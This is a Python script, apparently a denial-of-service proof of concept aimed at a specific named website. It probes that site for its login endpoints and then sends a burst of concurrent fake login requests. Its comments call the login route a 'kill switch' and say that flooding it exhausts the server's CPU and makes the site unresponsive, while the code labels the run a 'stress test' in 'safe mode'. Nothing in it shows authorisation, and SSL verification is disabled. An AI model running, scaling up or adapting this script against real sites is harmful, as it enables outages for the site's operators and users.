import requests
import threading
import time
import random
import string
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# TARGET LINK (The "Kill Switch" if flooded)
# This endpoint performs expensive password hashing (bcrypt/argon2).
# Flooding it exhausts the server's CPU, making the site unresponsive.
TARGET_URL = "https://cuewebapp.com/api/auth/login" 
# Note: Based on the scan, the actual endpoint might be /api/login or similar. 
# We will try the standard NextAuth route first, if 404, we fallback to /login (POST).

POSSIBLE_ENDPOINTS = [
    "https://cuewebapp.com/api/auth/callback/credentials",
    "https://cuewebapp.com/api/login",
    "https://cuewebapp.com/api/v2/login",
    "https://cuewebapp.com/login" # Sometimes this accepts POST directly in older frameworks
]

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def stress_worker(url, id):
    username = generate_random_string() + "@test.com"
    password = generate_random_string()
    
    # Payload designed to look legitimate but fail authentication
    payload = {
        "email": username,
        "password": password,
        "csrfToken": "fake-token-for-test",
        "json": "true"
    }
    
    start = time.time()
    try:
        r = requests.post(url, json=payload, headers={'User-Agent': 'StressTest/1.0'}, verify=False, timeout=10)
        elapsed = time.time() - start
        print(f"[Thread-{id}] Target: {url} | Status: {r.status_code} | Time: {elapsed:.2f}s")
    except Exception as e:
        print(f"[Thread-{id}] Failed: {e}")

print("[*] Starting CPU Exhaustion Proof-of-Concept...")
print("[*] We will send a burst of requests to identify the vulnerable login endpoint.")

# 1. Identify the correct endpoint first
active_endpoint = None
for ep in POSSIBLE_ENDPOINTS:
    try:
        print(f"[*] Probing {ep}...")
        r = requests.post(ep, json={"test":1}, verify=False, timeout=5)
        if r.status_code != 404:
            print(f"    [+] Found Active Auth Endpoint: {ep} (Status: {r.status_code})")
            active_endpoint = ep
            break
    except:
        pass

if not active_endpoint:
    print("[-] Could not identify exact API login route. Defaulting to /api/auth/callback/credentials")
    active_endpoint = "https://cuewebapp.com/api/auth/callback/credentials"

print(f"\n[*] Launching Stress Test against: {active_endpoint}")
print("[*] Sending 20 concurrent requests (Safe Mode)...")

threads = []
for i in range(20):
    t = threading.Thread(target=stress_worker, args=(active_endpoint, i,))
    threads.append(t)
    t.start()
    time.sleep(0.1) # Stagger slightly

for t in threads:
    t.join()

print("\n[*] Test Complete.")
print("    If Status is 200, 400, or 401: The server PROCESSED the request (CPU used).")
print("    If Status is 429: The server BLOCKED the request (Protected).")
